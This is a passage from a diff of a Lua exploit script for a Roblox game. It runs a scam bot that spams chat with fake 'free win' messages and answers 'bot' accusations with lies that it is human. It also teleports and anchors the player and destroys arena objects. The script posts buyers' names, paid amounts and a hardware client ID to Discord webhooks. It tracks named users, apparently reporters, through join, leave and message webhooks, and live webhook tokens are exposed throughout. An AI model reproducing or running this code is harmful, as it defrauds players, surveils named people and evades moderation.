+                    lastJumpTime = currentTime
+                end
+            end
+        end
+    end)
+end
+
+if player.Character then
+    setupJumpLoop(player.Character)
+end
+
+player.CharacterAdded:Connect(setupJumpLoop)
+
+--[[local player = Players.LocalPlayer
+local safePosition = Vector3.new(0, 10, 0)
+local fallThreshold = -10
+
+local function loop8()
+    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    if hrp and hrp.Position.Y < fallThreshold then
+        hrp.CFrame = CFrame.new(safePosition)
+    end
+end
+
+task.spawn(function()
+    while getgenv().i do
+        task.wait(0.5)
+        loop8()
+    end
+end)
+
+player.CharacterAdded:Connect(function()
+    task.spawn(function()
+        while getgenv().i do
+            task.wait(0.5)
+            loop8()
+        end
+    end)
+end)
+
+if player.Character then
+    loop8()
+end]]--
+
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+local Webhook_URL = "https://discord.com/api/webhooks/1382595464829866034/gmNHyERCeS-A7Z1hGE7wpONh31bERZJaHdU9sBJj001YceX_ZMsFy2lGU-dKdIrT2WCV"
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+
+local paidAmount = getOwnedTicketPriority()
+
+local _TTSERVICE = cloneref(game:GetService('TextChatService'))
+local _TCHANNEL = _TTSERVICE.TextChannels.RBXGeneral
+
+local blacklist = {
+    ["3_Dak"] = true,
+    ["BlueThikFish"] = true,
+    ["0CUH"] = true
+}
+
+local function chat(C_1)
+    for _, v in next, game.Players:GetPlayers() do
+        if blacklist[v.Name] then
+            return 
+        end
+    end
+    _TCHANNEL:SendAsync(C_1)
+end
+
+
+game.Players.LocalPlayer.PlayerGui.JumpRope.ChildAdded:Connect(function(child)
+    if child.Name == "Middle Middle Template" then
+        pcall(function()
+            local waitingGui = LocalPlayer.PlayerGui:FindFirstChild("WaitingForOpponent") and LocalPlayer.PlayerGui.WaitingForOpponent:FindFirstChild("Bottom Middle")
+            if not waitingGui then return end
+
+            local waitingBox = waitingGui:FindFirstChild("WaitingForOpponent")
+            if not waitingBox or not waitingBox.Visible then return end
+
+            local displayText = waitingBox.Background.Inside.DisplayName.Text
+            local playerDisplayName = LocalPlayer.DisplayName
+
+            print("[DEBUG] Display text:", displayText)
+
+            if displayText ~= playerDisplayName.." VS ????" then
+                local opponentName = displayText:match("VS (.+)")
+                print("[DEBUG] Parsed opponent name:", opponentName)
+
+                if opponentName then
+                    local opponentName2 = opponentName
+                    for _, player in ipairs(Players:GetPlayers()) do
+                        if player.DisplayName == opponentName then
+                            opponentName2 = player.Name
+                            print("[DEBUG] Resolved display name to username:", opponentName2)
+                            break
+                        end
+                    end
+
+                    if opponentName2 == opponentName then
+                        warn("[DEBUG] Could not resolve username from display name.")
+                    end
+
+		    local user = opponentName
+
+local messages5 = {
+    user .. " just picked up a win like it’s nothing 🔥",
+    "W delivered to " .. user .. " — smooth and easy 🚚",
+    "Guess who’s holding a fresh win? " .. user .. " 🏆",
+    user .. " walked in and walked out with a dub 🛫",
+    "Straight W sent to " .. user .. " 💌",
+    user .. " just bagged one for free 🎯",
+    "Win secured for " .. user .. " like clockwork ⏰",
+    user .. " is now part of the winner’s circle 🥇",
+    "Yup, " .. user .. " got one. Who’s next?",
+    "Don’t blink — " .. user .. " just got a dub 👀",
+    "Easy W drop for " .. user .. " ✅",
+    "That was quick — " .. user .. " is holding the W ⚡",
+    user .. " just scored without lifting a finger 👐",
+    "Free W just flew to " .. user .. " ✈️",
+    "Secured, stamped, and sent to " .. user .. " 📬",
+    user .. " picked up that win in style 😎",
+    "W vibes only — ask " .. user .. " 🌀",
+    "They didn’t expect it, but " .. user .. " just got a win 🎁",
+    user .. " is smiling different right now 😏",
+    "That W? It’s sitting with " .. user .. " now 💺",
+    "W hand-delivered to " .. user .. " 🛎️",
+    "Another name added to the W list: " .. user,
+    "That win hit smooth — just ask " .. user,
+    user .. " is the latest to collect a W 🎉",
+    "Dub confirmed for " .. user .. " 🔐",
+    "The line moves fast — " .. user .. " just got theirs 🏃‍♂️",
+    user .. " didn’t even sweat — still got a win 💨",
+    "Clean W loaded straight to " .. user .. "'s name 🧼",
+    "That W was all " .. user .. "'s. Next one might be yours.",
+    "Straight success — ask " .. user,
+    user .. " knows what a real W feels like now 🧠",
+    "Solid win. No strings. Just " .. user .. " winning 💯",
+    "Delivered without delay — W to " .. user,
+    user .. " is officially on the board with a win 🧾",
+    "That’s one more for the record. " .. user .. " just got it 📊",
+    user .. " left with a win. You still watching? 👀",
+    "Quick stop, easy W — ask " .. user,
+    "That win couldn’t have gone smoother for " .. user,
+    user .. " just got the kind of W people wait for ⏳",
+    "Real fast, real win — " .. user .. " got both 🏎️",
+    "Another clean delivery. " .. user .. " got the prize 🎯",
+    "No stress. Just dubs. " .. user .. " knows 🧘",
+    "You thinking — " .. user .. " winning 🧠➡️🏆",
+    "That moment when the W drops — just ask " .. user,
+    "Not everyone gets picked, but " .. user .. " did 🔥",
+    "Room's heating up — " .. user .. " just got blessed 🔥",
+    user .. " didn't chase it. The win found them 🎯",
+    "It’s official: " .. user .. " got it 💼",
+    user .. " got theirs. You ready for yours?",
+    "Name locked. W confirmed. Congrats, " .. user,
+    user .. " secured the latest drop 📦",
+    "You were watching history — " .. user .. " got a W",
+    "A moment of silence for that clean dub " .. user .. " just earned 🙌",
+    "No drama, just a win. " .. user .. " got it 💫",
+    user .. " stays winning, apparently 🧩",
+    "Big W alert — shoutout to " .. user,
+    "Like magic — win straight to " .. user .. " 🪄",
+    "Who’s next? " .. user .. " just claimed theirs 🥳",
+    user .. " left with something valuable — a dub 💸",
+    "It happened fast. W went to " .. user,
+    user .. " got theirs. What’s your excuse?",
+    "That wasn’t luck. " .. user .. " got picked fair 📣",
+    "Mark the moment — " .. user .. " just won 📍",
+    "The wheel spun and landed on " .. user .. " 🎡",
+    user .. " now knows what a real win looks like 👓",
+    "New W unlocked — " .. user .. " caught it 🔓",
+    "Quick hands, quick win. Ask " .. user,
+    "Dub made it to " .. user .. " like clockwork 🕒",
+    "Look who’s winning — " .. user,
+    "Locked in and walked out with it — " .. user,
+    "No contest. Just a free W for " .. user,
+    user .. " didn’t even ask — still got the win 🎤",
+    "Real win, real person, real fast — " .. user,
+    "Even if you blinked, that W still went to " .. user,
+    "The system picked right. " .. user .. " walks away with the win.",
+    user .. " earned it? Maybe. Got it? Definitely.",
+    "Dub detected — owner: " .. user,
+    "Celebrate one time for " .. user .. " 🎊",
+    "Don't be salty — just join like " .. "user did.",
+    "In and out with a W — the " .. user .. " special ✨",
+    "That win? Straight to " .. user .. ", no delays.",
+    user .. " got W access granted 🪪",
+    "Catch that? " .. user .. " just locked one in 🔐",
+    "Who’s got next? " .. user .. " just got theirs 📣",
+    "Another win in motion — delivered to " .. user,
+    "Delivery confirmed. " .. user .. " is the recipient 📦",
+    "Keep watching. You’ll see more like " .. user .. " win.",
+    user .. " walked away with more than they came in with 💼",
+    "Secure. Fast. Free. Win to " .. user,
+    "Let the record show: " .. user .. " grabbed a dub",
+    "Even the cleanest moves can’t top " .. user .. "'s luck today 🍀",
+    "New winner detected — shoutout to " .. user,
+    "Just like that, " .. user .. " joins the winners 🧩",
+    "Didn’t even break a sweat — " .. user .. " still got it",
+    "That name on the list? " .. user,
+    "If you doubted it — " .. user .. " just proved it’s real",
+    "One more for the highlight reel — " .. user .. "'s W 📽️",
+    user .. " with the clean claim 🧼",
+    "That one’s in the bag — good work " .. user,
+    "It’s your turn soon. Just like it was for " .. user,
+    "Just imagine your name where " .. user .. "'s is 👀",
+    "W log updated. New entry: " .. user,
+    user .. " now holds a real win — not just dreams 🛡️",
+    "Your name here? " .. user .. " made it already.",
+    "Next drop might be you. This one went to " .. user,
+    "Momentum shifting — " .. user .. " just triggered it 🔄",
+    "That W just settled in. Owner: " .. user,
+    "You blinked. " .. user .. " collected.",
+    "Room quieted down when " .. user .. " got that W 🤫",
+    "Leaderboard’s moving. Thanks to " .. user,
+    "Another name rises — " .. user .. ", welcome aboard 🚀"
+}
+
+		    for i = 1, math.random(1, 5) do
+			local index = math.random(1, #messages5)
+                    	local message = messages5[index]
+			print("Iteration #" .. i .. " - Sending message: " .. message)
+			chat(message)
+			task.wait(math.random(20, 30))
+		    end
+
+                    local t = os.date("*t")
+                    local hour = t.hour % 12
+                    hour = hour == 0 and 12 or hour
+                    local suffix = t.hour < 12 and "AM" or "PM"
+                    local timeString = string.format("%d:%02d %s", hour, t.min, suffix):upper()
+
+                    local response = request({
+                        Url = Webhook_URL,
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = HttpService:JSONEncode({
+                            ["username"] = "BOT_" .. string.upper(LocalPlayer.Name),
+                            ["avatar_url"] = avatarUrl,
+                            ["content"] = "",
+                            ["embeds"] = { {
+                                ["title"] = "**NETWORK SALE**",
+                                ["description"] = "Our content monitors on our bots have detected a product sale.",
+                                ["type"] = "rich",
+                                ["color"] = tonumber(0xffffff),
+                                ["fields"] = {
+                                    {
+                                        ["name"] = "Seller's Hardware ID:",
+                                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                                        ["inline"] = false
+                                    },
+                                    {
+                                        ["name"] = "Buyer's Username & Paid Amount:",
+                                        ["value"] = opponentName2 .. " & R$ " .. (paidAmount - paidAmount * 0.4),
+                                        ["inline"] = true
+                                    },
+                                    {
+                                        ["name"] = "Time of Sale:",
+                                        ["value"] = timeString,
+                                        ["inline"] = true
+                                    }
+                                }
+                            }}
+                        })
+                    })
+
+                    print("[DEBUG] Webhook response:", response and response.StatusCode or "No response")
+                end
+            end
+        end)
+    end
+end)
+
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local Webhook_URL2 = "https://discord.com/api/webhooks/1382595780887580733/qvK_TjqJ_YxMPyP2suGR5nW18tUer8FSYVjFeyHnVAoNKvhFrgSkFqrsU4g1qn18gExA"
+
+local function logToWebhook(message)
+    pcall(function()
+        request({
+            Url = Webhook_URL2,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "<@1281444060418015304>\n```[ERROR - " .. LocalPlayer.Name .. "]\n" .. message .. "\n```"
+            })
+        })
+    end)
+end
+
+RunService.RenderStepped:Connect(function()
+    if not workspace:FindFirstChild("ArenasREAL") then return end
+
+    local success, err = pcall(function()
+        for _, v in pairs(workspace.ArenasREAL:GetChildren()) do
+            local arenaTemplate = v:FindFirstChild("ArenaTemplate")
+            if arenaTemplate then
+                local red = arenaTemplate:FindFirstChild("Red")
+                if red then
+                    local playerText = red:FindFirstChild("PlayerText")
+                    if playerText and playerText:FindFirstChild("SurfaceGui") and playerText.SurfaceGui:FindFirstChild("TextLabel") then
+                        local phrase = playerText.SurfaceGui.TextLabel:FindFirstChild("_entirePhrase")
+                        if phrase and phrase[1] and phrase[1]:FindFirstChild("_untranslatableText") then
+                            if phrase[1]["_untranslatableText"].Value == LocalPlayer.DisplayName then
+                                local playingArenaTemplate = v:FindFirstChild("PlayingArenaTemplate")
+                                if playingArenaTemplate then
+                                    for _, child in pairs(playingArenaTemplate:GetChildren()) do
+                                        for _, subChild in pairs(child:GetChildren()) do
+                                            subChild:Destroy()
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    if not success then
+        print("[ERROR] Arena loop failed:", err)
+        logToWebhook(err)
+    end
+end)
+task.wait(0.1)
+end
+
+local player = game.Players.LocalPlayer
+local runService = game:GetService("RunService")
+local connection
+
+local function monitorCharacter(char)
+    local hrp = char:WaitForChild("HumanoidRootPart")
+
+    if connection then
+        connection:Disconnect()
+    end
+
+    connection = runService.Heartbeat:Connect(function()
+        local matched = false
+        for _, v in pairs(workspace.ArenasREAL:GetChildren()) do
+            local arenaTemplate = v:FindFirstChild("ArenaTemplate")
+            if arenaTemplate then
+                local red = arenaTemplate:FindFirstChild("Red")
+                if red then
+                    local playerText = red:FindFirstChild("PlayerText")
+                    if playerText and playerText:FindFirstChild("SurfaceGui") and playerText.SurfaceGui:FindFirstChild("TextLabel") then
+                        local phrase = playerText.SurfaceGui.TextLabel:FindFirstChild("_entirePhrase")
+                        if phrase and phrase[1] and phrase[1]:FindFirstChild("_untranslatableText") then
+                            if phrase[1]["_untranslatableText"].Value == player.DisplayName then
+                                matched = true
+                                break
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        hrp.Anchored = matched
+	    if matched then
+	    repeat task.wait() until game.Players.LocalPlayer.Character:FindFirstChild("Torso") and game.Players.LocalPlayer.Character.Torso.BrickColor == BrickColor.new("Really red")
+	    hrp.CFrame = CFrame.new(80.5872345, 6.33885431, 7.43055534, -0.198523447, -6.30572643e-08, -0.980096161, 1.08204743e-08, 1, -6.65295801e-08, 0.980096161, -2.38127864e-08, -0.198523447)
+        task.wait(0.1)
+        end
+    end)
+end
+
+if player.Character then
+    monitorCharacter(player.Character)
+end
+
+player.CharacterAdded:Connect(monitorCharacter)
+
+local HttpService = cloneref(game:GetService("HttpService"))
+local TextChatService = cloneref(game:GetService("TextChatService"))
+local LocalPlayer = game.Players.LocalPlayer
+
+local webhookUrl = "https://discord.com/api/webhooks/1382596024413065236/hsdzp1R27TkdEu-nMZe8bBunv7KATeO6Mpvq4J2hS3r09300Kfk4EnadeV9qXSkWasTA"
+local generalChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+
+local _TTSERVICE = cloneref(game:GetService('TextChatService'))
+local _TCHANNEL = _TTSERVICE.TextChannels.RBXGeneral
+
+local blacklist = {
+    ["3_Dak"] = true,
+    ["BlueThikFish"] = true,
+    ["0CUH"] = true
+}
+
+local function chat(C_1)
+    for _, v in next, game.Players:GetPlayers() do
+        if blacklist[v.Name] then
+            return 
+        end
+    end
+    _TCHANNEL:SendAsync(C_1)
+end
+
+
+local blacklist = {
+    "bottom",
+    "bottle",
+    "reboot",
+    "boton",
+    "botones",
+    "botas",
+}
+
+local function isBlacklisted(text)
+    for _, word in ipairs(blacklist) do
+        if string.find(text, word) then
+            return true
+        end
+    end
+    return false
+end
+
+if generalChannel then
+    generalChannel.MessageReceived:Connect(function(msg)
+        local lowerMsg = string.lower(msg.Text)
+
+        if isBlacklisted(lowerMsg) then
+            return
+        end
+
+        if string.find(lowerMsg, "%f[%a]bot%f[%A]") then
+            if table.find(whitelistedBots, msg.TextSource.Name) then
+                return
+            end
+
+            if msg.TextSource.Name == LocalPlayer.Name then
+                return
+            end
+
+local messages4 = {
+    "If I was fake, you wouldn’t be seeing all these wins.",
+    "Think I’m scripted? Stick around and watch the results.",
+    "Real people do real things — like handing out dubs.",
+    "You’ll know I’m real when you catch your W.",
+    "Talk all you want — I’m still giving out wins.",
+    "Don’t worry about what I am. Just get your W.",
+    "Too smooth to be fake. Too fast to be caught.",
+    "You ever seen a bot hand out wins like this? Didn’t think so.",
+    "No bots here — just clean plays and cleaner wins.",
+    "Wins don’t lie. Watch the scoreboard.",
+    "I don’t need to convince you. The Ws do that.",
+    "I’ve been doing this all day — and I’m not stopping.",
+    "Some call it luck. I call it giving people what they deserve.",
+    "You’re here doubting while others are winning.",
+    "What bot you know gives real dubs this consistently?",
+    "You’re overthinking. Just take the win.",
+    "Try watching instead of guessing — the answer’s in front of you.",
+    "If I was a bot, I’d be broken by now.",
+    "I’ve got rhythm, timing, and aim — bots can’t fake that.",
+    "All these wins? They don’t program themselves.",
+    "I don’t talk much. I just hand out results.",
+    "You’ll understand when your W lands.",
+    "I move like a person because I am one.",
+    "Bots stall. I deliver.",
+    "I don’t glitch. I give Ws.",
+    "You’re reading this in real time. That’s all the proof you need.",
+    "Bots don’t know how to pick winners like I do.",
+    "Not automated. Just efficient.",
+    "Only thing fake here is your doubt.",
+    "Every dub I give is earned — and real.",
+    "I’m just here doing what I do best — win duty.",
+    "Bots get detected. I get dubs.",
+    "Keep watching. You’ll figure it out soon.",
+    "I choose who gets a W. That’s not something a bot can do.",
+    "Think what you want. Wins keep coming.",
+    "Even if you don’t believe me, your W is still waiting.",
+    "You can guess all day — the results won’t change.",
+    "Believe or not, I’ve got one with your name on it.",
+    "No scripts. Just decisions.",
+    "Call me anything, just don’t miss your win.",
+    "Keep doubting — more Ws for those who don’t.",
+    "Bots can’t improvise. I just handed out 3 random Ws.",
+    "Smooth with it — like a real one.",
+    "Wins keep rolling. I keep choosing.",
+    "They always ask if I’m real. Never thank me for the dub.",
+    "Try getting a bot to hand out wins with personality.",
+    "What bot has this much style?",
+    "You know who doesn’t care what you think? Winners.",
+    "Keep talking, I’ll keep delivering.",
+    "I’m active, alive, and handing them out by choice.",
+    "Bots can’t adapt — I give wins based on the room.",
+    "You say bot, I say built different.",
+    "I’ve got timing — bots don’t.",
+    "You’re watching something you don’t understand — yet.",
+    "This many dubs? That’s precision, not programming.",
+    "One W at a time, proving I’m the real thing.",
+    "A script couldn’t handle this level of accuracy.",
+    "These wins have flavor. That’s how you know it’s me.",
+    "There’s intention behind every dub I give.",
+    "Random? Never. I know exactly what I’m doing.",
+    "You ever seen a bot improvise? Me neither.",
+    "Call it instinct. Call it skill.",
+    "All these dubs didn’t come from nowhere.",
+    "Presence like this isn’t artificial.",
+    "You’ll stop doubting once your name’s called.",
+    "Every time I give a win, I get stronger.",
+    "I react. Bots don’t.",
+    "You’re here watching someone do what bots can’t.",
+    "You felt that? That’s not code — that’s real.",
+    "No copy-paste here. Just moves.",
+    "Every win has a reason. And I’m the reason.",
+    "Winners know real when they see it.",
+    "One of us is giving dubs — the other is guessing.",
+    "Bots can’t adjust on the fly. I just did.",
+    "You’re not used to this kind of smooth operation.",
+    "You think too small. I think in wins.",
+    "Notice the pace? That’s real flow.",
+    "No bot knows how to read the room like this.",
+    "Still guessing? I’m still giving.",
+    "This isn’t code — it’s craft.",
+    "I see the lobby. I choose who eats.",
+    "If this was fake, you wouldn’t still be watching.",
+    "I’ve got rhythm. I’ve got dubs. That’s real.",
+    "No AI needed when you’re built like this.",
+    "Bots follow orders. I make decisions.",
+    "A dub is a choice. And I chose them.",
+    "Bots can’t be this consistent.",
+    "Real presence. Real pressure. Real Ws.",
+    "Not fake. Just efficient.",
+    "This feels different because it is.",
+    "Doubt is loud. Wins are louder.",
+    "I’ve got awareness — not automation.",
+    "You know what’s not fake? Results.",
+    "You keep typing. I keep handing out Ws.",
+    "Bots rely on inputs. I rely on instinct.",
+    "The room shifts when I arrive.",
+    "I’m live. I’m locked in. I’m giving dubs.",
+    "These moves? Manual. Every time.",
+    "Precision like this isn’t random.",
+    "I’m just consistent — not coded.",
+    "They watch, they doubt, they lose.",
+    "I pick. I choose. I win.",
+    "This is what presence looks like.",
+    "I’m handing out Ws. What are you doing?",
+    "Not a guess. Not a glitch. A decision.",
+    "Every dub proves I’m here — now.",
+    "Call it what you want. The Ws are real.",
+    "I don’t run loops. I make plays.",
+    "No system. Just decisions and delivery.",
+    "If I’m fake, explain the win count.",
+    "I adapt — that’s not automation.",
+    "Bots can’t vibe like this.",
+    "These wins have intention. That’s all me.",
+    "There’s energy here — and it’s not scripted.",
+    "Bots don’t read names. I do.",
+    "Wins hit harder when they’re handpicked.",
+    "I don’t follow a cycle. I follow my eye.",
+    "If you can feel it, it’s not fake.",
+    "Bots don’t do what I do — they just try.",
+    "Your doubt won’t stop me from delivering.",
+    "I operate different. Because I am.",
+    "Dub dealer — and I do it by choice.",
+    "Wins are rolling because I’m active.",
+    "You just witnessed something real.",
+    "This many dubs? It’s not random. It’s me."
+}
+
+            local index = math.random(1, #messages4)
+            local message = messages4[index]
+            local timeTook = math.random(5.5, 11)
+
+            task.wait(timeTook)
+            sendChat(message)
+
+            local userId = msg.TextSource and msg.TextSource.UserId
+            local sender = game.Players:GetPlayerByUserId(userId or 0)
+            local senderName = sender and sender.Name or (msg.PrefixText or "Unknown")
+
+            local t1 = os.date("*t")
+            t1.hour = t1.hour - 7
+            if t1.hour < 0 then
+                t1.hour = t1.hour + 24
+                t1.day = t1.day - 1
+            end
+
+            local hour1 = t1.hour % 12
+            hour1 = hour1 == 0 and 12 or hour1
+            local suffix1 = t1.hour < 12 and "AM" or "PM"
+            local timeString1 = string.format("%d:%02d %s", hour1, t1.min, suffix1):upper()
+
+            local payload = {
+                username = "LENGTH_BOT_REPORTER",
+                embeds = { {
+                    title = "BOT MENTION DETECTED",
+                    description = "Our content monitors have detected the blacklisted word bot in chat.",
+                    color = 0xFF0000,
+                    fields = {
+                        {name = "BOT Username", value = "BOT_"..LocalPlayer.Name, inline = true},
+                        {name = "Sender Username", value = senderName, inline = true},
+                        {name = "Message", value = msg.Text, inline = false},
+                        {name = "Response", value = message, inline = false},
+                        {name = "Response Time", value = timeTook, inline = false},
+                        {name = "Job ID", value = game.JobId, inline = false},
+                        {name = "Time", value = timeString1, inline = false}
+                    }
+                } }
+            }
+
+            local response = request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+
+            print("[DEBUG] Webhook response:", response and response.StatusCode or "No response")
+        end
+    end)
+else
+    warn("[DEBUG] RBXGeneral channel not found.")
+end
+
+local _TTSERVICE = cloneref(game:GetService('TextChatService'))
+local _TCHANNEL = _TTSERVICE.TextChannels.RBXGeneral
+
+local blacklist = {
+    ["3_Dak"] = true,
+    ["BlueThikFish"] = true,
+    ["0CUH"] = true
+}
+
+local function chat(C_1)
+    for _, v in next, game.Players:GetPlayers() do
+        if blacklist[v.Name] then
+            return 
+        end
+    end
+    _TCHANNEL:SendAsync(C_1)
+end
+
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+
+local textChannels = TextChatService:WaitForChild("TextChannels")
+local generalChannel = textChannels:FindFirstChild("RBXGeneral")
+
+local blacklist = {
+	Dvlig3rzk = {
+		joinWebhook = "https://discord.com/api/webhooks/1382596418274983956/o2o0AdlaW_OLNA3hD4uQB96T3X9eQ2JW9-CHEsGgiCOYcLgPrq8BhRe-P_geo1gKQuPt",
+		leaveWebhook = "https://discord.com/api/webhooks/1382596555894427740/Dum5c4VbBZOxU76K07ZRI6CCwXeRJB9p3UAd6ZHzKHrlHsmg1K39Ekwr2chRqNdVGUkJ",
+		messageWebhook = "https://discord.com/api/webhooks/1382596642137706537/pDUQ_yD6VKPoaYTJENY2JY4W15-ky2MZmEaDTiJ9zRI3HkY0m54oH3Z48HebrF4OMEuX",
+		color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+	},
+	Lucky_DuckyPlayzYT = {
+		joinWebhook = "https://discord.com/api/webhooks/1388750337724387428/lh2RutjpLJD4Q4AJljs1eiYdPLQS-0loTm4anI9aWPK0hCUGUQkv-OOUd6riY5SBDDVX",
+		messageWebhook = "https://discord.com/api/webhooks/1388931308155179230/FOqlh_RIWCM074qa6bPFWD4wOeUjXYwtvPuaZ9gwUZRdLW7ZhC2Nel3xJy4FcFPjBcuk",
+		leaveWebhook = "https://discord.com/api/webhooks/1388936194708213800/RbVcUqSZ_kiVUz_R2EQvcGLdTFbXT3k1lQ1SgChAloGTtALezV5Gp5S_UN2yow2MQLrF",
+		color = { join = 0x00FF00, message = 0xFFFFFF, leave = 0xFF0000 },
+		titlePrefix = "Double Down - REPORTER DETECTION"
+	},
+	Kylian_0512 = {
+		joinWebhook = "https://discord.com/api/webhooks/1388932074345463898/yHQVqbAwUWUpFF5ed2p3pbioAmGF1LNXGsxPymcB8uUyzZ6tEbvplojnPB-ZTzqSjQKf",
+		messageWebhook = "https://discord.com/api/webhooks/1388932605751066816/zbmI1EzuG4dQgLnlZJdfCNjNEGO_Vq9h1ngLOWOzIt99eCXGO_xSbsDxClPRxG0uMcNb",
+		leaveWebhook = "https://discord.com/api/webhooks/1388936302128267406/dmMQU2ikGxp_INwEs2djP2VrUUyxw7qgrN9zbZFdjbPlLuHYrOF6IOOKddcLSGnPOqXP",
+		color = { join = 0x00FF00, message = 0xFFFFFF, leave = 0xFF0000 },
+		titlePrefix = "Double Down - REPORTER DETECTION"
+	},
+	aleki2010a = {
+		joinWebhook = "https://discord.com/api/webhooks/1388936423540920490/L6IQdfcv99NfIg0dgR9wMoFnb3AXiutTY1GDzNGpl1pgiYAwQNht4Z4UsSZU2j1f7nQa",
+		messageWebhook = "https://discord.com/api/webhooks/1388936502657941545/84V3PZvJPpcrBrV2AklKKxEjoX_ClweEmkkDPWBc-RKi-gYIrErY6QA8c6PykhGtc76e",
+		leaveWebhook = "https://discord.com/api/webhooks/1388936726323396639/yJreqRDl-5iuz5eDKt2LCOfPmhCccF6vEma7C-4Z4RHRmkrnwM_i7dKSi5rXkkovQG6-",
+		color = { join = 0x00FF00, message = 0xFFFFFF, leave = 0xFF0000 },
+		titlePrefix = "Double Down"
+	},
+	danielperu = {
+		joinWebhook = "https://discord.com/api/webhooks/1389106415783907348/_MgXihDjeMRTe1Y3YChdserbprX2HOI32kzjPMZWEFXvTuDo1m1myhwx4fI-UK4OLTGx",
+		leaveWebhook = "https://discord.com/api/webhooks/1389106525406105640/cvSERqKu4otsHT4WeybUDuyePQlwSaiaH_3gH8Qv5Mlo2CHjosDclIh2RBQ9vSQ1aoD4",
+		messageWebhook = "https://discord.com/api/webhooks/1389106603415834757/atdmCDj4g6YcXQgx25AEHXEn_A1AWX2rkpJQNdLkNpd_Vg8ppTnbb01yc_nrc9_es695",
+		color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+	},
+	leothomas27 = {
+		joinWebhook = "https://discord.com/api/webhooks/1389108501590048770/UoVUml58SMTnC3V9UY-Uwd0TS9jbXHkWDd3_nT6T_sBY9SQggAFUx7eAdcgZ-Ea3vs_o",
+		leaveWebhook = "https://discord.com/api/webhooks/1389108571035140196/q61Z-AgecrxwtkXZD3qekfLZOu4T0oW_1alSR5zfPjqAwn3tRlnAwHCWIKEJhEEXn-bw",
+		messageWebhook = "https://discord.com/api/webhooks/1389108616354599103/lPrEgdv8s7q7b2wqc0xzCUhnCKyX7i4pDZC9xfpTtp5DHlrx2Qi0H3BTG3hfVs5tNdO0",
+		color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+	},
+	NotoriuS_25 = {
+		joinWebhook = "https://discord.com/api/webhooks/1389109490242027540/StUT5k1UcNHx_iwF7Cvw2Lp2Ka3P4em6H5LraB4gNtgAiveUT2T7wQAaX4AJMiaABmcP",
+		leaveWebhook = "https://discord.com/api/webhooks/1389109559456432180/BpKlbJyHubxuGGIBL23W7sAGv5uLwsetGWSfxXdpETXjCrSJg6W6TJ6zHrpSFR5oHXAq",
+		messageWebhook = "https://discord.com/api/webhooks/1389109624434589749/yE0w8N4yKj90Ck-rE1oTCPDFrkvkP0l72gElQJXS7JwmgIrhRZYRj1UbBRQ0_KNLRUMw",
+		color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+	},
+    Mini_Zlob5000 = {
+        joinWebhook = "https://discord.com/api/webhooks/1389386475954507919/UnrL5rQVioyy5TIt8E0OBrYZCCJp7vQEWj9KiKoEaRHtu4AHQgtaeBsXaWMnWIV9XXvI",
+        leaveWebhook = "https://discord.com/api/webhooks/1389386566446747749/bwDmwLjFW_HJy88hKxRsv0cHpPoj_r4ckz50T5_hDA7wbgWzHpsjzy289iYwYguYNLay",
+        messageWebhook = "https://discord.com/api/webhooks/1389386633131987034/QhaS-hD-ctiUAqQuZEt4rTZa6FBI6dKYkiaC6e4LfDUpjTc73Zt4JjBNSZljCzo5dnqN",
+        color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+        titlePrefix = "REPORTER, TARGETED DETECTED"
+    },
+	BlueThikFish = {
+		joinWebhook = "https://discord.com/api/webhooks/1389383752156709007/SXorOba1D45LEFhIHnO_9eE6FH6AsZRHWzANCD42rAEm7eJhB0oGf1ZrIZZ2Xjc8Ujr_",
+		leaveWebhook = "https://discord.com/api/webhooks/1389383822164103318/KZjjrkvcfOCt9zza13uK5pKvP_PO3hCDSjgmsRLdm_LSAaleczGJrqEw0hley3j2QJcu",
+		messageWebhook = "https://discord.com/api/webhooks/1389383893022670929/mlKnbksMimC_gxVzoDHsa9Vpy-w_YBuL9RJGRtIgDLJqR6d3dRCSWsZoIey2EhCKALOH",
+		color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+	},
+    ["0CUH"] = {
+        joinWebhook = "https://discord.com/api/webhooks/1390950891795906621/ZMSNApTniOhK-iE3YoAXN9tpm3ubGsR_0Dqhv2bvjkGewu9T-6nfCOF7Arke53fEWZdd",
+        leaveWebhook = "https://discord.com/api/webhooks/1390950979578626088/lw0-OWCYgCb252mxk6357N1uvWQng86GwgRbHmuZ5HLNcID-BX7uI472Ih4MSMeQcn6M",
+        messageWebhook = "https://discord.com/api/webhooks/1390951088567488562/QoiItXNa_Mr30gS8IRo1S5lstcHr4O8P4UYq9VMraZv5rbvDZv7cFsSNKjyryuQdDju9",
+        color = { join = 0x00FF00, leave = 0xFF0000, message = 0xFFFFFF },
+		titlePrefix = "Double Down"
+    },
+    ["3_Dak"] = {
+        joinWebhook = "https://discord.com/api/webhooks/1390951573814902886/GRlmNZy3ewvqDmVNbkBMwgGfU8SE2DnXg29Od9_QxuxBZw1oAFYu9DVZi0fUZveojf0I",
